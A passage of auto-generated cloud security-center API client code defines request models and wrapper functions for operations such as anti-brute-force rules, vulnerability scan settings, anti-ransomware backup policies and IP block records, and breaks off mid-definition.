async function modifyAntiBruteForceRuleWithOptions(request: ModifyAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAntiBruteForceRule(request: ModifyAntiBruteForceRuleRequest): ModifyAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyAppVulScanCycleRequest {
  cycle?: string(name='Cycle', example='1week'),
}

model ModifyAppVulScanCycleResponseBody = {
  requestId?: string(name='RequestId', example='AFEDC54D-70A2-5E56-A69B-E3D8AA8A5197'),
}

model ModifyAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAppVulScanCycleResponseBody(name='body'),
}

async function modifyAppVulScanCycleWithOptions(request: ModifyAppVulScanCycleRequest, runtime: Util.RuntimeOptions): ModifyAppVulScanCycleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cycle)) {
    query['Cycle'] = request.cycle;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAppVulScanCycle(request: ModifyAppVulScanCycleRequest): ModifyAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAppVulScanCycleWithOptions(request, runtime);
}

model ModifyAssetGroupRequest {
  groupId?: long(name='GroupId', example='9586199'),
  sourceIp?: string(name='SourceIp', example='10.12.XX.XX'),
  uuids?: string(name='Uuids', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
}

model ModifyAssetGroupResponseBody = {
  requestId?: string(name='RequestId', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model ModifyAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetGroupResponseBody(name='body'),
}

/**
  * The ID of the new server group to which the servers belong.
  * >  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.
  *
  * @param request ModifyAssetGroupRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyAssetGroupResponse
 */
async function modifyAssetGroupWithOptions(request: ModifyAssetGroupRequest, runtime: Util.RuntimeOptions): ModifyAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The ID of the new server group to which the servers belong.
  * >  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.
  *
  * @param request ModifyAssetGroupRequest
  * @return ModifyAssetGroupResponse
 */
async function modifyAssetGroup(request: ModifyAssetGroupRequest): ModifyAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetGroupWithOptions(request, runtime);
}

model ModifyAssetImportantRequest {
  importantCode?: int32(name='ImportantCode', example='0'),
  uuidList?: string(name='UuidList', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
}

model ModifyAssetImportantResponseBody = {
  errCode?: string(name='ErrCode', example='ServerError'),
  errMessage?: string(name='ErrMessage', example='ServerError'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='23C85959-1540-514B-93CF-2992C53A1B4F'),
  success?: boolean(name='Success', example='true'),
}

model ModifyAssetImportantResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetImportantResponseBody(name='body'),
}

async function modifyAssetImportantWithOptions(request: ModifyAssetImportantRequest, runtime: Util.RuntimeOptions): ModifyAssetImportantResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.importantCode)) {
    query['ImportantCode'] = request.importantCode;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetImportant',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAssetImportant(request: ModifyAssetImportantRequest): ModifyAssetImportantResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetImportantWithOptions(request, runtime);
}

model ModifyAutoDelConfigRequest {
  days?: int32(name='Days', description='The number of days after which a detected vulnerability is automatically deleted. Unit: days. Valid values:

*   7
*   30
*   90', example='30'),
}

model ModifyAutoDelConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFA659D-F44F-5703-8FD1-33AB596BEACA'),
}

model ModifyAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAutoDelConfigResponseBody(name='body'),
}

async function modifyAutoDelConfigWithOptions(request: ModifyAutoDelConfigRequest, runtime: Util.RuntimeOptions): ModifyAutoDelConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.days)) {
    query['Days'] = request.days;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAutoDelConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAutoDelConfig(request: ModifyAutoDelConfigRequest): ModifyAutoDelConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAutoDelConfigWithOptions(request, runtime);
}

model ModifyBackupPolicyRequest {
  id?: long(name='Id', description='The region ID of the server to which the anti-ransomware policy is applied.

You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='11'),
  name?: string(name='Name', description='Modifies an anti-ransomware policy.', example='policy_name_A'),
  policy?: map[string]any(name='Policy', description='ModifyBackupPolicy', example='{"Source":["home","admin"]}'),
  policyRegionId?: string(name='PolicyRegionId', example='cn-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='WB01014029', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model ModifyBackupPolicyShrinkRequest {
  id?: long(name='Id', description='The region ID of the server to which the anti-ransomware policy is applied.

You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='11'),
  name?: string(name='Name', description='Modifies an anti-ransomware policy.', example='policy_name_A'),
  policyShrink?: string(name='Policy', description='ModifyBackupPolicy', example='{"Source":["home","admin"]}'),
  policyRegionId?: string(name='PolicyRegionId', example='cn-hangzhou'),
  policyVersion?: string(name='PolicyVersion', description='WB01014029', example='2.0.0'),
  uuidList?: [ string ](name='UuidList', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model ModifyBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model ModifyBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyResponseBody(name='body'),
}

async function modifyBackupPolicyWithOptions(tmpReq: ModifyBackupPolicyRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyBackupPolicyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.policy)) {
    request.policyShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.policy, 'Policy', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policyShrink)) {
    query['Policy'] = request.policyShrink;
  }
  if (!Util.isUnset(request.policyRegionId)) {
    query['PolicyRegionId'] = request.policyRegionId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyBackupPolicy(request: ModifyBackupPolicyRequest): ModifyBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyWithOptions(request, runtime);
}

model ModifyBackupPolicyStatusRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.', example='30490'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0'),
  status?: string(name='Status', description='Specifies whether to enable or disable the anti-ransomware policy. Valid values:

*   **enabled**: enables the anti-ransomware policy. After you enable the anti-ransomware policy, the anti-ransomware feature protects data on your servers. Data on your servers is backed up based on the policy.
*   **disabled**: disables the anti-ransomware policy. After you disable the anti-ransomware policy, the data backup task that is running based on the policy stops.

>  When the system runs data backup tasks, your network bandwidth is consumed. We recommend that you enable the anti-ransomware policy during peak-off hours to back up data.', example='enabled'),
}

model ModifyBackupPolicyStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E342452B-4401-5F74-9A1B-D24479851173'),
}

model ModifyBackupPolicyStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyStatusResponseBody(name='body'),
}

async function modifyBackupPolicyStatusWithOptions(request: ModifyBackupPolicyStatusRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicyStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyBackupPolicyStatus(request: ModifyBackupPolicyStatusRequest): ModifyBackupPolicyStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyStatusWithOptions(request, runtime);
}

model ModifyClearLogstoreStorageRequest {
  from?: string(name='From', example='sas'),
  lang?: string(name='Lang', example='zh'),
  userLogStore?: string(name='UserLogStore', example='sas_sls_storage'),
  userProject?: string(name='UserProject', example='sas-log-1234(uid)-cn-hangzhou'),
}

model ModifyClearLogstoreStorageResponseBody = {
  requestId?: string(name='RequestId', example='DC84C453-8561-5EC4-B0E9-44E67ACCB5B5'),
}

model ModifyClearLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClearLogstoreStorageResponseBody(name='body'),
}

async function modifyClearLogstoreStorageWithOptions(request: ModifyClearLogstoreStorageRequest, runtime: Util.RuntimeOptions): ModifyClearLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.userLogStore)) {
    query['UserLogStore'] = request.userLogStore;
  }
  if (!Util.isUnset(request.userProject)) {
    query['UserProject'] = request.userProject;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClearLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClearLogstoreStorage(request: ModifyClearLogstoreStorageRequest): ModifyClearLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClearLogstoreStorageWithOptions(request, runtime);
}

model ModifyClientConfSetupRequest {
  strategyConfig?: string(name='StrategyConfig', example='{
      "cpu": "20"
}'),
  strategyTag?: string(name='StrategyTag', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', example='major'),
}

model ModifyClientConfSetupResponseBody = {
  requestId?: string(name='RequestId', example='60E24426-B910-5D7F-8B8B-3BCDC3FC****'),
}

model ModifyClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfSetupResponseBody(name='body'),
}

async function modifyClientConfSetupWithOptions(request: ModifyClientConfSetupRequest, runtime: Util.RuntimeOptions): ModifyClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyConfig)) {
    query['StrategyConfig'] = request.strategyConfig;
  }
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientConfSetup(request: ModifyClientConfSetupRequest): ModifyClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfSetupWithOptions(request, runtime);
}

model ModifyClientConfStrategyRequest {
  tag?: string(name='Tag', description='The key of the tag that is added to the agent configuration policy.', example='machineResource'),
  tagExt?: string(name='TagExt', description='The extended tag of the agent configuration policy.', example='auto'),
  tagValue?: string(name='TagValue', description='The value of the tag that is added to the agent configuration policy.

*   major
*   advanced
*   basic', example='advanced'),
  uuid?: string(name='Uuid', description='The UUID of the server that you want to query.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  uuids?: [ string ](name='Uuids', description='The UUID of the asset. You can specify a maximum of 500 UUIDs at a time.'),
}

model ModifyClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9089D0AB-835F-5663-AB5E-4FF646BB****'),
}

model ModifyClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfStrategyResponseBody(name='body'),
}

async function modifyClientConfStrategyWithOptions(request: ModifyClientConfStrategyRequest, runtime: Util.RuntimeOptions): ModifyClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagExt)) {
    query['TagExt'] = request.tagExt;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientConfStrategy(request: ModifyClientConfStrategyRequest): ModifyClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfStrategyWithOptions(request, runtime);
}

model ModifyClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', example='0'),
  cmdline?: string(name='Cmdline', example='/usr/sbin/s****'),
  filePath?: string(name='FilePath', example='/etc/pam.d/su****'),
  IP?: string(name='IP', example='1.1.XX.XX'),
  id?: long(name='Id', example='210****'),
  md5List?: string(name='Md5List', example='aa5ee3ed4363c9d195a591a70281****,3e522d6f3bf5cf88bb77e9ff3d13****'),
  name?: string(name='Name'),
  newFilePath?: string(name='NewFilePath', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', example='C:/Windows/System32/cmd****'),
  platform?: string(name='Platform', example='linux'),
  port?: int32(name='Port', example='22'),
  portStr?: string(name='PortStr', example='80'),
  procPath?: string(name='ProcPath', example='/root/1111/****'),
  registryContent?: string(name='RegistryContent', example='SECOH-QAD****'),
  registryKey?: string(name='RegistryKey', example='HKEY_DYN_****'),
  type?: int32(name='Type', example='2'),
}

model ModifyClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='5cbb3c39-88ec-429a-be26-5d0f62cc****'),
}

model ModifyClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientUserDefineRuleResponseBody(name='body'),
}

async function modifyClientUserDefineRuleWithOptions(request: ModifyClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): ModifyClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClientUserDefineRule(request: ModifyClientUserDefineRuleRequest): ModifyClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientUserDefineRuleWithOptions(request, runtime);
}

model ModifyClusterCnnfStatusUserConfirmRequest {
  clusterIds?: [ string ](name='ClusterIds'),
  userConfirm?: boolean(name='UserConfirm', example='true'),
}

model ModifyClusterCnnfStatusUserConfirmResponseBody = {
  requestId?: string(name='RequestId', example='4FFBEDBD-FA63-5213-9103-306519EE4857'),
}

model ModifyClusterCnnfStatusUserConfirmResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClusterCnnfStatusUserConfirmResponseBody(name='body'),
}

async function modifyClusterCnnfStatusUserConfirmWithOptions(request: ModifyClusterCnnfStatusUserConfirmRequest, runtime: Util.RuntimeOptions): ModifyClusterCnnfStatusUserConfirmResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.userConfirm)) {
    query['UserConfirm'] = request.userConfirm;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClusterCnnfStatusUserConfirm',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyClusterCnnfStatusUserConfirm(request: ModifyClusterCnnfStatusUserConfirmRequest): ModifyClusterCnnfStatusUserConfirmResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClusterCnnfStatusUserConfirmWithOptions(request, runtime);
}

model ModifyConcernNecessityRequest {
  concernNecessity?: string(name='ConcernNecessity', description='The priorities to fix the vulnerabilities. Valid values:

*   asap: high
*   later: medium
*   nntf: low', example='asap,nntf'),
}

model ModifyConcernNecessityResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='F059E190-A65B-5DF8-8709-2CC7791A5B65'),
}

model ModifyConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyConcernNecessityResponseBody(name='body'),
}

async function modifyConcernNecessityWithOptions(request: ModifyConcernNecessityRequest, runtime: Util.RuntimeOptions): ModifyConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.concernNecessity)) {
    query['ConcernNecessity'] = request.concernNecessity;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyConcernNecessity(request: ModifyConcernNecessityRequest): ModifyConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyConcernNecessityWithOptions(request, runtime);
}

model ModifyCreateVulWhitelistRequest {
  reason?: string(name='Reason', example='This vulnerability is not harmful'),
  targetInfo?: string(name='TargetInfo', example='{"type":"GroupId","uuids":[],"groupIds":[10782678]}'),
  whitelist?: string(name='Whitelist', example='[{"Status":0,"GmtLast":1662281929000,"LaterCount":0,"AsapCount":1,"Name":"oval:com.redhat.rhsa:def:20172836","Type":"cve","Related":"CVE-2017-14491,CVE-2017-14492,CVE-2017-14493,CVE-2017-14494,CVE-2017-14495,CVE-2017-14496","HandledCount":1,"AliasName":"RHSA-2017:2836-Critical: dnsmasq security update","RuleModifyTime":1535542395000,"NntfCount":0,"TotalFixCount":196668,"Tags":"Exploit Exists,Code Execution"},{"Status":0,"GmtLast":1662281933000,"LaterCount":0,"AsapCount":1,"Name":"oval:com.redhat.rhsa:def:20173075","Type":"cve","Related":"CVE-2017-13089,CVE-2017-13090","HandledCount":1,"AliasName":"RHSA-2017:3075-Important: wget security update","RuleModifyTime":1551432867000,"NntfCount":0,"TotalFixCount":369136,"Tags":"Code Execution"}]'),
}

model ModifyCreateVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', example='6B23A612-D997-5176-8C3B-D640DFD65772'),
  vulWhitelistList?: [ 
    {
      id?: long(name='Id', example='30376'),
    }
  ](name='VulWhitelistList'),
}

model ModifyCreateVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCreateVulWhitelistResponseBody(name='body'),
}

async function modifyCreateVulWhitelistWithOptions(request: ModifyCreateVulWhitelistRequest, runtime: Util.RuntimeOptions): ModifyCreateVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCreateVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCreateVulWhitelist(request: ModifyCreateVulWhitelistRequest): ModifyCreateVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCreateVulWhitelistWithOptions(request, runtime);
}

model ModifyCustomBlockRecordRequest {
  blockIp?: string(name='BlockIp', example='10.12.XX.XX'),
  bound?: string(name='Bound', example='out'),
  expireTime?: long(name='ExpireTime', example='1940899881000'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  uuids?: string(name='Uuids', example='2516fe4f-adb6-45d1-87a7-90ce1213****,30746836-68d0-47f6-8b2d-c93150da****,7c3ac531-077b-46b8-8706-5c8d4e73****'),
}

model ModifyCustomBlockRecordResponseBody = {
  requestId?: string(name='RequestId', example='A4EE4B1F-CEF8-5A75-86D3-D012CB3D****'),
}

model ModifyCustomBlockRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyCustomBlockRecordResponseBody(name='body'),
}

async function modifyCustomBlockRecordWithOptions(request: ModifyCustomBlockRecordRequest, runtime: Util.RuntimeOptions): ModifyCustomBlockRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.bound)) {
    query['Bound'] = request.bound;
  }
  if (!Util.isUnset(request.expireTime)) {
    query['ExpireTime'] = request.expireTime;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyCustomBlockRecord(request: ModifyCustomBlockRecordRequest): ModifyCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCustomBlockRecordWithOptions(request, runtime);
}

model ModifyCycleTaskRequest {
  configId?: string(name='ConfigId', example='00cfa8161da093089e6804ba6a33****'),
  enable?: int32(name='Enable', example='1'),
  firstDateStr?: long(name='FirstDateStr', example='1664380800000'),
  intervalPeriod?: int32(name='IntervalPeriod', example='14'),
  param?: string(name='Param', example='{
      "targetInfo": [
            {
                  "type": "groupId",
                  "name": "TI HOST",
                  "target": 10597***
            },
            {
                  "type": "groupId",
                  "name": "expense HOST",
                  "target": 10597***
            }
      ]
}'),
  periodUnit?: string(name='PeriodUnit', example='day'),
  targetEndTime?: int32(name='TargetEndTime', example='6'),
  targetStartTime?: int32(name='TargetStartTime', example='0'),
  taskName?: string(name='TaskName', example='EMG_VUL_SCHEDULE_SCAN'),
